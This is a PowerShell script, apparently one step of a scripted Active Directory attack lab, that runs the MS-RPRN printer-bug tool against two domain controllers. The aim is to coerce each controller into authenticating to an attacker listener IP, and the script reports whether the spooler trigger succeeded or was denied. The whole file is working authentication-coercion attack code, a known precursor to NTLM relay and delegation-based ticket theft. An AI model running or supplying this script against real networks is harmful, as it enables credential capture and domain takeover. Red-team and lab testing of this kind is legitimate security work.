[CmdletBinding()]
param(
    [string]$AttackIp = "192.168.77.60",
    [string]$Dc01 = "dc01.cadre.local",
    [string]$Dc02 = "dc02.child.cadre.local"
)
$ErrorActionPreference = "Continue"
$exe = "C:\Tools\cadre-attack\MS-RPRN.exe"
if (-not (Test-Path -LiteralPath $exe -ErrorAction SilentlyContinue)) {
    Write-Output "T017_FAIL: MS-RPRN.exe missing"
    exit 1
}
$listener = ('\\' + $AttackIp)
foreach ($name in @($Dc02, $Dc01)) {
    $dc = ('\\' + $name)
    Write-Output ("T017_TRY " + $dc + " -> " + $listener)
    $r = & $exe $dc $listener 2>&1 | Out-String
    if ($r -match "Error Code 5|RPC Exception 5") {
        Write-Output ("T017_DENIED " + $dc)
        continue
    }
    Write-Output ("T017_SPOOL_TRIGGERED " + $dc)
    Write-Output "T017_OK"
    exit 0
}
Write-Output "T017_FAIL: MS-RPRN RPC denied as DA on dc02 and dc01"
exit 1
